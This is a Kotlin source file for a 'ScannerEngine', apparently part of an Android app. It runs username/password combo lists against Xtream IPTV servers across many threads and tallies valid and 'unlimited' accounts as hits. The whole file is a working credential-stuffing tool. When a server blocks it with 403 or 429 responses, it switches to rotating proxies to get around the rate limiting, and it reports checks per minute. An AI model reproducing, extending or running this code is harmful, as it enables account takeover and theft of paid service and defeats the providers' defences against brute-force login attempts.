package com.ascan.ascanagent.data

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.asCoroutineDispatcher
import kotlinx.coroutines.cancel
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

class ScannerEngine {

    private var job: kotlinx.coroutines.Job? = null
    private val paused = AtomicBoolean(false)
    private val stopped = AtomicBoolean(true)

    var onStats: ((ScanStats) -> Unit)? = null
    var onHit: ((Hit) -> Unit)? = null
    var onLog: ((String) -> Unit)? = null
    var onServerStatus: ((List<ServerStatus>) -> Unit)? = null
    var onFinished: (() -> Unit)? = null

    fun isRunning(): Boolean = !stopped.get()
    fun isPaused(): Boolean = paused.get()

    fun start(
        servers: List<String>,
        combo: List<Credential>,
        comboName: String,
        threads: Int,
        mode: AtkMode,
        proxies: List<String> = emptyList(),
        order: ScanOrder = ScanOrder.SEQUENCIAL
    ) {
        stop()
        stopped.set(false)
        paused.set(false)

        val checks = AtomicInteger(0)
        val hits = AtomicInteger(0)
        val unlimited = AtomicInteger(0)
        val e403 = AtomicInteger(0)
        val e429 = AtomicInteger(0)
        val timeouts = AtomicInteger(0)
        val startMs = System.currentTimeMillis()
        val total = (servers.size * combo.size).coerceAtLeast(1)
        val proxyIdx = AtomicInteger(0)
        val serverHits = ConcurrentHashMap<String, AtomicInteger>()
        val serverState = ConcurrentHashMap<String, String>()
        val serverDetail = ConcurrentHashMap<String, String>()
        val useProxyFor = ConcurrentHashMap<String, Boolean>()
        val consecutiveTo = ConcurrentHashMap<String, AtomicInteger>()
        val alive200 = ConcurrentHashMap<String, Boolean>()
        val stateMutex = Mutex()

        val hosts = servers.map { XtreamApi.normServer(it) }.distinct()
        hosts.forEach {
            serverHits[it] = AtomicInteger(0)
            serverState[it] = if (order == ScanOrder.PARALELO) "SCAN" else "WAIT"
            serverDetail[it] = ""
            useProxyFor[it] = false
            consecutiveTo[it] = AtomicInteger(0)
            alive200[it] = false
        }

        onLog?.invoke(
            "Start ${hosts.size} srv (${order.label}) | ${combo.size} combo | thr $threads | ${mode.label} r${mode.retries} | px ${proxies.size}"
        )

        val thr = threads.coerceIn(1, 64)
        val thrPerHost = if (order == ScanOrder.PARALELO) {
            (thr / hosts.size.coerceAtLeast(1)).coerceIn(2, 32)
        } else thr

        val poolSize = if (order == ScanOrder.PARALELO) {
            (thrPerHost * hosts.size).coerceIn(2, 64)
        } else thr
        val pool = Executors.newFixedThreadPool(poolSize)
        val dispatcher = pool.asCoroutineDispatcher()
        val scope = CoroutineScope(SupervisorJob() + dispatcher)

        fun pushStats() {
            val elapsed = ((System.currentTimeMillis() - startMs) / 1000).coerceAtLeast(1)
            try {
                onStats?.invoke(
                    ScanStats(
                        checks = checks.get(),
                        hits = hits.get(),
                        unlimited = unlimited.get(),
                        errors403 = e403.get(),
                        errors429 = e429.get(),
                        timeouts = timeouts.get(),
                        cpm = ((checks.get() * 60.0) / elapsed).toInt(),
                        progress = checks.get().toFloat() / total,
                        elapsedSec = elapsed,
                        totalCombo = combo.size,
                        proxies = proxies.size
                    )
                )
                val ranking = hosts.map { h ->
                    val hc = serverHits[h]?.get() ?: 0
                    val st = when {
                        hc > 0 -> "ON"
                        else -> serverState[h] ?: "..."
                    }
                    ServerStatus(host = h, state = st, hits = hc, detail = serverDetail[h] ?: "")
                }.sortedWith(
                    compareByDescending<ServerStatus> { it.hits }
                        .thenBy { hosts.indexOf(it.host) }
                )
                onServerStatus?.invoke(ranking)
            } catch (_: Exception) {
            }
        }

        suspend fun scanOneHost(server: String, idx: Int) {
            if (stopped.get()) return
            stateMutex.withLock {
                serverState[server] = "SCAN"
            }
            onLog?.invoke("→ Servidor ${idx + 1}/${hosts.size}: $server")
            pushStats()

            val channel = Channel<Credential>(capacity = Channel.UNLIMITED)
            val producer = scope.launch {
                for (cred in combo) {
                    if (stopped.get()) break
                    channel.send(cred)
                }
                channel.close()
            }

            val workers = List(thrPerHost) {
                scope.launch {
                    for (cred in channel) {
                        if (stopped.get()) break
                        while (paused.get() && !stopped.get()) delay(200)
                        if (stopped.get()) break
                        if (mode.delayMs > 0) delay(mode.delayMs)

                        val needPx = proxies.isNotEmpty() && (useProxyFor[server] == true)
                        val proxy = if (needPx) {
                            proxies[proxyIdx.getAndIncrement() % proxies.size]
                        } else null

                        var result = XtreamApi.check(
                            server, cred.user, cred.pass,
                            timeoutSec = if (proxy != null) mode.timeoutSec.coerceAtMost(5) else mode.timeoutSec,
                            proxyUrl = proxy,
                            retries = mode.retries
                        )

                        if (proxy == null && proxies.isNotEmpty() && (
                                result.code == 403 || result.code == 429 ||
                                    result.err.contains("403") || result.err.contains("429")
                                )
                        ) {
                            useProxyFor[server] = true
                            stateMutex.withLock {
                                if ((serverHits[server]?.get() ?: 0) == 0) {
                                    serverState[server] = "PROT"
                                    serverDetail[server] = "bloqueio"
                                }
                            }
                            val px = proxies[proxyIdx.getAndIncrement() % proxies.size]
                            result = XtreamApi.check(
                                server, cred.user, cred.pass,
                                timeoutSec = mode.timeoutSec.coerceAtMost(5),
                                proxyUrl = px,
                                retries = mode.retries
                            )
                        }

                        if (proxy != null && !result.hit && (
                                result.err.contains("Timeout", true) || result.code == 0
                                )
                        ) {
                            val direct = XtreamApi.check(
                                server, cred.user, cred.pass,
                                timeoutSec = mode.timeoutSec,
                                proxyUrl = null,
                                retries = 1
                            )
                            if (direct.hit || direct.code in listOf(200, 403, 429)) {
                                result = direct
                            }
                        }

                        val n = checks.incrementAndGet()
                        when {
                            result.hit -> {
                                consecutiveTo[server]?.set(0)
                                alive200[server] = true
                                val hit = XtreamApi.buildHit(
                                    server, cred.user, cred.pass, result.data, comboName
                                )
                                hits.incrementAndGet()
                                if (hit.unlimited) unlimited.incrementAndGet()
                                serverHits[server]?.incrementAndGet()
                                stateMutex.withLock {
                                    serverState[server] = "ON"
                                    serverDetail[server] = "hit"
                                }
                                try { onHit?.invoke(hit) } catch (_: Exception) {}
                            }
                            result.code == 403 || result.err.contains("403") -> {
                                consecutiveTo[server]?.set(0)
                                e403.incrementAndGet()
                                if (proxies.isNotEmpty()) useProxyFor[server] = true
                                stateMutex.withLock {
                                    if ((serverHits[server]?.get() ?: 0) == 0) {
                                        serverState[server] = "PROT"
                                        serverDetail[server] = "403"
                                    }
                                }
                            }
                            result.code == 429 || result.err.contains("429") -> {
                                consecutiveTo[server]?.set(0)
                                e429.incrementAndGet()
                                if (proxies.isNotEmpty()) useProxyFor[server] = true
                                stateMutex.withLock {
                                    if ((serverHits[server]?.get() ?: 0) == 0) {
                                        serverState[server] = "PROT"
                                        serverDetail[server] = "429"
                                    }
                                }
                            }
                            result.err.contains("Timeout", true) || result.code == 0 -> {
                                timeouts.incrementAndGet()
                                val cto = consecutiveTo[server]?.incrementAndGet() ?: 1
                                if (cto >= 12 && alive200[server] != true &&
                                    (serverHits[server]?.get() ?: 0) == 0
                                ) {
                                    stateMutex.withLock {
                                        if (serverState[server] !in listOf("ON", "PROT")) {
                                            serverState[server] = "OFF"
                                            serverDetail[server] = "timeouts"
                                        }
                                    }
                                }
                            }
                            result.code == 200 -> {
                                consecutiveTo[server]?.set(0)
                                alive200[server] = true
                                stateMutex.withLock {
                                    if ((serverHits[server]?.get() ?: 0) == 0 &&
                                        serverState[server] != "PROT"
                                    ) {
                                        serverState[server] = "ON"
                                        serverDetail[server] = "vivo"
                                    }
                                }
                            }
                        }

                        if (n % 8 == 0 || result.hit) pushStats()
                    }
                }
            }

            producer.join()
            workers.forEach { it.join() }
            if (stopped.get()) return

            val hc = serverHits[server]?.get() ?: 0
            stateMutex.withLock {
                when {
                    hc > 0 -> {
                        serverState[server] = "ON"
                        serverDetail[server] = "hits"
                    }
                    serverState[server] == "PROT" -> {}
                    serverState[server] == "OFF" -> {}
                    alive200[server] == true -> {
                        serverState[server] = "DONE"
                        serverDetail[server] = "sem hit no combo"
                    }
                    else -> {
                        if ((consecutiveTo[server]?.get() ?: 0) >= 8) {
                            serverState[server] = "OFF"
                            serverDetail[server] = "sem resposta"
                        } else {
                            serverState[server] = "DONE"
                            serverDetail[server] = "fim"
                        }
                    }
                }
            }
            onLog?.invoke("✓ Fim $server | ${serverState[server]} | hits $hc")
            pushStats()
        }

        job = scope.launch {
            if (order == ScanOrder.PARALELO) {
                val jobs = hosts.mapIndexed { idx, server ->
                    launch { scanOneHost(server, idx) }
                }
                jobs.forEach { it.join() }
            } else {
                for ((idx, server) in hosts.withIndex()) {
                    if (stopped.get()) break
                    scanOneHost(server, idx)
                    if (idx < hosts.lastIndex && !stopped.get()) {
                        onLog?.invoke("→ Proximo: ${hosts[idx + 1]}")
                    }
                }
            }

            stopped.set(true)
            val elapsed = ((System.currentTimeMillis() - startMs) / 1000).coerceAtLeast(1)
            try {
                onStats?.invoke(
                    ScanStats(
                        checks = checks.get(),
                        hits = hits.get(),
                        unlimited = unlimited.get(),
                        errors403 = e403.get(),
                        errors429 = e429.get(),
                        timeouts = timeouts.get(),
                        cpm = ((checks.get() * 60.0) / elapsed).toInt(),
                        progress = 1f,
                        elapsedSec = elapsed,
                        totalCombo = combo.size,
                        proxies = proxies.size
                    )
                )
                onLog?.invoke("Fim total | Hits ${hits.get()} | Checks ${checks.get()}")
                onFinished?.invoke()
            } catch (_: Exception) {
            }
            scope.cancel()
            pool.shutdownNow()
        }
    }

    fun pause() {
        paused.set(true)
        onLog?.invoke("Pausado")
    }

    fun resume() {
        paused.set(false)
        onLog?.invoke("Retomado")
    }

    fun stop() {
        stopped.set(true)
        paused.set(false)
        job?.cancel()
        job = null
    }
}
